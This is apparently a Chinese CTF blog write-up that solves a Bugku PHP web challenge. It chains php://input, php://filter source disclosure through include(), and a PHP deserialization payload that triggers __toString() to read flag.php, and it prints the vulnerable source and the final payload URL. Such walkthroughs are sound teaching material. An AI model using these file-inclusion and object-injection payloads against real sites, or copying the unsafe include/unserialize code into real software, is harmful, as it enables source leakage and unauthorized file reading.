---
title: 【Bugku CTF】 Web —— welcome to bugkuctf
copyright: true
date: 2018-01-03 22:40:23
tags: [bugku,CTF,writeup,audit,php]
categories: [InfoSec,Web]
---

# 0x00 前言

此题运用了许多 PHP 技巧，解题思路惊艳，特此想分享一下思考过程。与其说此题是 Web 题，不如说是道 PHP 技巧题，难度中等，要求有**扎实的 PHP 基础**。

涉及到的技巧有 **PHP 伪协议、魔术方法、对象的序列化与反序列化**等，相关链接如下：

- 题目链接：[http://123.206.31.85/challenges#welcome to bugkuctf](http://123.206.31.85/challenges#welcome%20to%20bugkuctf)
- 解题链接：[http://120.24.86.145:8006/test1/](http://120.24.86.145:8006/test1/)

<!-- more -->

![question](http://oyhh4m1mt.bkt.clouddn.com/Bugku_CTF_Web_welcome_to_bugkuctf/question.png)

# 0x01 PHP 伪协议获取源码

点开链接，依然按常规套路只有一句话：**you are not the number of bugku !**，继续查看源码发现线索：

![hint](http://oyhh4m1mt.bkt.clouddn.com/Bugku_CTF_Web_welcome_to_bugkuctf/hint.png)

这里需要满足两点：

1. 构造合适的 URL 查询变量 `txt` 使得 PHP 变量 `$user` 满足 if 语句的条件
2. 令变量 `$file` 通过文件包含函数 `include()` 获取指定页面的源码

注意，此处还未涉及到查询变量 `password`。

## php://input

在 if 语句中，通过 `file_get_contents()` 函数读取变量 `$user` 的值后，再与字符串 `welcome to the bugkuctf` 比较。

因此可借助伪协议 [php://](http://php.net/manual/zh/wrappers.php.php) 中的 `php://input` 访问原始请求数据中的只读流。这里令 `$user = "php://input"`，并在请求主体中提交字符串 `welcome to the bugkuctf`。

## php://filter

在 `include($file); //hint.php` 语句中，相当于把变量 `$file` 的值在该语句的位置读入，结合后面的提示，应该是要把 hint.php 页面的源码以某种形式包含在当前页面内。

因此可利用 `php://filter` 以某种方式筛选过滤特定的数据流。这里令 `$file = php://filter/read=convert.base64-encode/resource=hint.php`，意思是**以 Base64 编码的方式过滤出 hint.php 页面的源码**，也可以把它理解为一个具有 URI 形式的特殊函数，该函数能把 hint.php 源码以 Base64 编码的方式读入。

根据以上两种 PHP 伪协议的分析，构造出以下 payload 即得 hint.php 源码的 Base64 编码:

![get_source](http://oyhh4m1mt.bkt.clouddn.com/Bugku_CTF_Web_welcome_to_bugkuctf/get_source.png)

解码后得到 hint.php 源码：

``` php
<?php  
  
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
			echo "<br>";
		return ("good");
        }  
    }  
}  
?>  
```

根据注释发现了藏 flag 的页面，再次照葫芦画瓢去偷看 flag.php 源码：

![flag_fail](http://oyhh4m1mt.bkt.clouddn.com/Bugku_CTF_Web_welcome_to_bugkuctf/flag_fail.png)

...果然没那么简单，唔，卡住了，怎么办？

别忘了还有主页面啊！**利用主页面的功能也能读取自身的源码**，这一点很容易被遗忘，所以这次很顺利就获得了 index.php 的源码（注意，路径末尾不带 php 文件的 URL `http://120.24.86.145:8006/test1/`，一般默认就是访问 `http://120.24.86.145:8006/test1/index.php`）：

``` php
<?php  
$txt = $_GET["txt"];  
$file = $_GET["file"];  
$password = $_GET["password"];  
  
if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  
    echo "hello friend!<br>";  
    if(preg_match("/flag/",$file)){ 
		echo "不能现在就给你flag哦";
        exit();  
    }else{  
        include($file);   
        $password = unserialize($password);  
        echo $password;  
    }  
}else{  
    echo "you are not the number of bugku ! ";  
}  
  
?>  
  
<!--  
$user = $_GET["txt"];  
$file = $_GET["file"];  
$pass = $_GET["password"];  
  
if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
    echo "hello admin!<br>";  
    include($file); //hint.php  
}else{  
    echo "you are not admin ! ";  
}  
 -->  
```

注意到第 8 行将 `$file` 变量中的 `flag` 字符串过滤了，印证了前面的结果。到此，我们顺利地将此题变成一道 PHP 白盒审计题了，现在才是此题最有意思的地方，如何利用已知的 hint.php 与 index.php 的源码去获取 flag.php 的内容？请继续往下看。

# 0x02 序列化构造 payload

要理清 hint.php 与 index.php 之间的关系，首先要理解 hint.php 中的 `__tostring()` 函数是何方神圣。

## 魔术方法 __toString()

「写在前面」：PHP 中变量与方法的命名一般遵循**小驼峰式命名法（Lower Camel Case）**，类的命名一般遵循**大驼峰式命名法（Upper Camel Case）**，也称**帕斯卡命名法（Pascal Case）**，并且**普通变量、超级全局变量、常量、数组索引等区分大小写**，而**函数名、方法名、类名、魔术变量等不区分大小写**，但最好使用与定义一样的大小写名字。详情可参考：

> [驼峰式大小写](https://zh.wikipedia.org/wiki/%E9%A7%9D%E5%B3%B0%E5%BC%8F%E5%A4%A7%E5%B0%8F%E5%AF%AB)
> [PHP命名大小写敏感规则](https://www.cnblogs.com/daipianpian/p/5721377.html)

因此看到此魔术方法定义为 `__toString()`，在源码中却是 `__tostring()` 就不足为奇了。

**魔术方法 [__toString()](http://php.net/manual/zh/language.oop5.magic.php#object.tostring)** 定义在类中，在该类的对象被当成字符串打印时执行，并且必须返回一个字符串，否则出现报错。

因此在 hint.php 中，当 `Flag` 类的对象被打印时，将获取 `$file` 变量（注意此处的 `$file` 与 index.php 中的不同）中文件的内容并输出，最后返回字符串 `good`。

## 对象的序列化

再来看看 index.php 的 11-15 行，满足了上面所有 if 语句的条件后，先包含变量 `$file`，再反序列化变量 `$password` 后输出。此段代码是本题的核心，理解了就能找到 index.php 与 hint.php 之间的联系，从而构造出 payload。

**核心思想如下：先用 `include()` 函数包含 hint.php，从而引入 `Flag` 类；再将该类对象的序列化字符串赋值给 `$passsword`，且令对象的成员变量 `$file = flag.php`， 所以在反序列化后得到上述对象；最后用 `echo` 打印该对象，从而触发 `__toString()` 函数，输出 flag.php 的值。**

通过以下代码可获得成员变量 `$file = flag.php` 的 `Flag` 对象的序列化字符串：`O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} `

``` php
<?php 
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("good");
        }  
    }  
}  
$f = new Flag();
$f->file = 'flag.php';
echo serialize($f);
?> 
```

根据以上所有的分析，可以将 payload 总结如下：

**`http://120.24.86.145:8006/test1/?txt=php://input&file=hint.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`**

最后别忘了在请求主体中提交字符串 `welcome to the bugkuctf` 喔，提交后得到 flag：

![flag](http://oyhh4m1mt.bkt.clouddn.com/Bugku_CTF_Web_welcome_to_bugkuctf/flag.png)

若有不足或错误之处劳烦指出，欢迎有疑问的朋友前来留言讨论。